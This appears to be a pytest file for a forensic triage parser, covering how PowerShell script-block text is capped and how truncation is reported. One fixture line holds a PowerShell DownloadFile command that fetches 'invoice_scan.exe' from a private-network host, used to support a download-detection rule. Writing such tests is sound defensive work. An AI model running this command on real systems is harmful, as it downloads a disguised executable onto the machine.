"""Capped script-block text: the field R-ATOMIC-0003 was blocked on.

4104 originally dropped ScriptBlockText entirely, on the reasonable grounds
that a block can run to tens of kilobytes and details is carried in every
timeline row. The consequence was that no Event field said what a script did,
so an encoded/download PowerShell rule could not be written at all.

Measuring the corpus showed the size objection applies only to benign
initialisation blocks. These tests pin the cap, the honesty of the truncation
metadata, and the fact that the attack-relevant blocks survive it intact.
"""

import os
from pathlib import Path

import pytest

from dfir_triage_pipeline.parsers.evtx_windows import (
    SCRIPT_BLOCK_TEXT_CAP,
    EvtxWindowsParser,
    _truncate_utf8,
    record_to_event,
)

PS_REL = (
    "C/Windows/System32/winevt/logs/Microsoft-Windows-PowerShell%4Operational.evtx"
)

XML = """<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <EventID>4104</EventID>
    <TimeCreated SystemTime="2026-08-23T22:10:02.123456Z"/>
    <EventRecordID>9001</EventRecordID>
    <Computer>WINDOWS10</Computer>
  </System>
  <EventData>
    <Data Name="MessageNumber">1</Data>
    <Data Name="MessageTotal">1</Data>
    <Data Name="ScriptBlockText">{text}</Data>
    <Data Name="ScriptBlockId">455024bc-f82c-40a9-b4e3-a16247618cc0</Data>
    <Data Name="Path"></Data>
  </EventData>
</Event>"""

DOWNLOAD = (
    '(New-Object System.Net.WebClient).DownloadFile'
    '("http://192.168.50.2:8000/invoice_scan.exe", "$env:TEMP\\test.exe")'
)


def _details(text):
    return record_to_event(XML.format(text=text), "evtx.powershell", PS_REL).details


def test_short_script_is_carried_whole_and_not_marked_truncated():
    d = _details(DOWNLOAD)
    assert d["script_block_text"] == DOWNLOAD
    assert d["script_block_text_bytes"] == str(len(DOWNLOAD.encode()))
    assert "script_block_truncated" not in d


def test_long_script_is_capped_and_says_so():
    text = "A" * 20_000
    d = _details(text)
    assert len(d["script_block_text"].encode()) == SCRIPT_BLOCK_TEXT_CAP
    assert d["script_block_truncated"] == "true"


def test_reported_length_is_the_original_not_the_stored_length():
    """The point of the field. A consumer must be able to measure how much was
    not recorded; if it reported the stored length it would always equal the
    cap and would say nothing."""
    d = _details("A" * 20_000)
    assert d["script_block_text_bytes"] == "20000"
    assert int(d["script_block_text_bytes"]) > SCRIPT_BLOCK_TEXT_CAP


def test_truncation_never_splits_a_character():
    """A multi-byte character straddling the cap must be dropped, not cut into
    invalid bytes and not replaced with a character that was never in the
    evidence."""
    text, full, truncated = _truncate_utf8("e" + "é" * 5000, SCRIPT_BLOCK_TEXT_CAP)
    assert truncated
    assert len(text.encode()) <= SCRIPT_BLOCK_TEXT_CAP
    assert "�" not in text
    text.encode("utf-8")  # would raise if the cut produced invalid text


def test_exact_cap_boundary_is_not_marked_truncated():
    """Off-by-one guard: text of exactly the cap length is complete."""
    d = _details("A" * SCRIPT_BLOCK_TEXT_CAP)
    assert "script_block_truncated" not in d
    assert d["script_block_text_bytes"] == str(SCRIPT_BLOCK_TEXT_CAP)


def test_absent_script_text_emits_no_text_fields():
    """A 4104 with no text is not a zero-length script. Emitting an empty
    string would let a positive-operator rule read it as a real empty block."""
    d = _details("")
    assert "script_block_text" not in d
    assert "script_block_text_bytes" not in d


COLLECTION = os.environ.get("DFIR_TEST_COLLECTION")


@pytest.mark.skipif(not COLLECTION, reason="DFIR_TEST_COLLECTION not set")
def test_cap_holds_across_the_real_channel():
    abs_path = Path(COLLECTION) / PS_REL
    if not abs_path.exists():
        pytest.skip("PowerShell operational channel not in this collection")
    events = list(EvtxWindowsParser().parse(abs_path, PS_REL))
    if not events:
        pytest.skip("channel carries no script blocks")

    for e in events:
        text = e.details.get("script_block_text")
        if text is None:
            continue
        assert len(text.encode()) <= SCRIPT_BLOCK_TEXT_CAP
        full = int(e.details["script_block_text_bytes"])
        # Truncation must be declared whenever, and only when, it happened.
        assert ("script_block_truncated" in e.details) == (full > SCRIPT_BLOCK_TEXT_CAP)


@pytest.mark.skipif(not COLLECTION, reason="DFIR_TEST_COLLECTION not set")
def test_scenario_download_blocks_survive_the_cap_intact():
    """The measurement that justifies the cap.

    s1_v2 carries five WebClient DownloadFile blocks fetching invoice_scan.exe
    -- three from 192.168.50.2 and two from the earlier 192.168.50.5 host -- and
    every one is 112 or 113 bytes, far inside the 4 KB cap. A cap that
    truncated these would have made R-ATOMIC-0003 unwritable for a second
    reason, so this is pinned rather than assumed.
    """
    if "s1_v2" not in str(COLLECTION):
        pytest.skip("assertion is about the scenario collection")
    abs_path = Path(COLLECTION) / PS_REL
    if not abs_path.exists():
        pytest.skip("PowerShell operational channel not in this collection")

    hits = [
        e
        for e in EvtxWindowsParser().parse(abs_path, PS_REL)
        if "downloadfile" in e.details.get("script_block_text", "").lower()
    ]
    assert len(hits) == 5
    assert all("script_block_truncated" not in e.details for e in hits)
    assert all("invoice_scan.exe" in e.details["script_block_text"] for e in hits)
